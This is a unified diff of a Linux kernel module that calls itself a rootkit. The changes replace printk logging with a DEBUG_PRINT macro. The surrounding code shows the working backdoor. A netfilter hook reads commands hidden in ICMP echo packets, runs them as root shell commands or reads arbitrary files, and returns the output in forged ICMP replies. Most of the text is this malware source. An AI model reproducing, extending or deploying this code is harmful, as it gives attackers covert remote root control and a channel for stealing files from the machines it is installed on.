@@ -4,10 +4,19 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/workqueue.h>
 #include <linux/udp.h>
-#include <linux/icmp.h>
 #include <linux/inet.h>
 
 #include <linux/fs.h>
+
+
+#define DEBUG
+
+#ifdef DEBUG
+#define DEBUG_PRINT(format, ...) printk(KERN_INFO format, __VA_ARGS__);
+#else
+#define DEBUG_PRINT(format, ...) 
+#endif
+
 
 
 // number of valid commands
@@ -75,7 +84,7 @@ static int __init startup(void)
     nfho.priority = NF_IP_PRI_FIRST;
     nf_register_net_hook(&init_net, &nfho);
     
-    printk(KERN_INFO "rootkit: start\n");
+    DEBUG_PRINT("rootkit: start\n", "")
 
     return 0;
 }
@@ -84,7 +93,7 @@ static void __exit cleanup(void)
 {
     // unregistering the hook after module was removed
     nf_unregister_net_hook(&init_net, &nfho);
-    printk(KERN_INFO "rootkit: finished\n");
+    DEBUG_PRINT("rootkit: finished\n", "")
 }
 
 
@@ -98,7 +107,7 @@ static void run_shell_command(char* bash_command) {
     char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
     char *envp[] = {"PATH=/bin:/sbin", NULL};
 
-    printk(KERN_INFO "rootkit: performing bash command\n");
+    DEBUG_PRINT("rootkit: performing bash command\n", "")
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
@@ -118,7 +127,7 @@ static int read_file(char* filename, char* buffer, int to_read) {
     f = filp_open(filename, O_RDONLY, 0);
 
     if (IS_ERR(f)) {
-        printk(KERN_INFO "rootkit: file was not open\n");
+        DEBUG_PRINT("rootkit: file was not open\n", "")
         return -1;
     }
 
@@ -126,7 +135,7 @@ static int read_file(char* filename, char* buffer, int to_read) {
     kernel_read(f, (void*) buffer, to_read, &offset);
 
 
-    printk(KERN_INFO "rootkit: file was read: %s\n", buffer);
+    DEBUG_PRINT("rootkit: file was read: %s\n", buffer)
 
     filp_close(f, NULL);
     
@@ -190,11 +199,11 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     struct ethhdr* new_eth;
 
 
-    printk(KERN_INFO "rootkit: 1\n");
+    DEBUG_PRINT("rootkit: 1\n", "")
     // allocation memort for 3 headers + payload
     skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);
 
-    printk(KERN_INFO "rootkit: 2\n");
+    DEBUG_PRINT("rootkit: 2\n", "")
 
     // reserving size for headers
     skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);
@@ -219,7 +228,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     saddr_copy = new_iph->saddr;
     new_iph->saddr = new_iph->daddr;
     new_iph->daddr = saddr_copy;
-    printk(KERN_INFO "rootkit: 3\n");
+    DEBUG_PRINT("rootkit: 3\n", "")
 
     // configuring the socket
     skb->dev = dev;
@@ -239,7 +248,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     // adding the packet to transmit queue
     ret = dev_queue_xmit(skb);
 
-    printk(KERN_INFO "rootkit: ret: %d\n", ret);
+    DEBUG_PRINT("rootkit: ret: %d\n", ret)
     
 
     return ret;
@@ -272,12 +281,12 @@ static void rootkit_handler(struct work_struct* work) {
 
     switch (command) {
         case RUN:
-            printk(KERN_INFO "rootkit: shell command: %s \n", args->string);
+            DEBUG_PRINT("rootkit: shell command: %s \n", args->string)
             run_shell_command(args->string);
             send_response("rootkit: command was performed\0", args);
             break;
         case CAT:
-            printk(KERN_INFO "rootkit: cat command: %s \n", args->string);
+            DEBUG_PRINT("rootkit: cat command: %s \n", args->string);
             // checking errors
             if (read_file(args->string, buffer, CAT_BUFFER_SIZE) == 0) {   
                 send_response(buffer, args);
@@ -287,7 +296,7 @@ static void rootkit_handler(struct work_struct* work) {
             
             break;
         default:
-            printk(KERN_INFO "rootkit: invalid command\n");
+            DEBUG_PRINT("rootkit: invalid command\n", "")
             send_response("rootkit: invallid command\0", args);
             break;
     }
@@ -319,19 +328,19 @@ static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struc
     icmph = icmp_hdr(skb);
 
 
-    printk(KERN_INFO "rootkit: ckecking connection\n");
+    DEBUG_PRINT("rootkit: ckecking connection\n", "")
 
 
     if (iph->protocol != IPPROTO_ICMP) {
-        printk(KERN_INFO "rootkit: bad protocol\n");
+        DEBUG_PRINT("rootkit: bad protocol\n", "")
         return NF_ACCEPT;
     }
     if (icmph->type != ICMP_ECHO) {
-        printk(KERN_INFO "rootkit: bad request type\n");
+        DEBUG_PRINT("rootkit: bad request type\n", "")
         return NF_ACCEPT;
     }
 
-    printk(KERN_INFO "rootkit: parsing command\n");
+    DEBUG_PRINT("rootkit: parsing command\n", "")
 
     args = kmalloc(sizeof(args_t), GFP_KERNEL);
 
@@ -360,7 +369,7 @@ static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struc
     args->iph = iph;
     args->skb = skb;
 
-    printk(KERN_INFO "rootkit: scheduling rootkit action \n");
+    DEBUG_PRINT("rootkit: scheduling rootkit action \n", "")
     INIT_WORK(&args->work, rootkit_handler);
     schedule_work(&args->work);
 
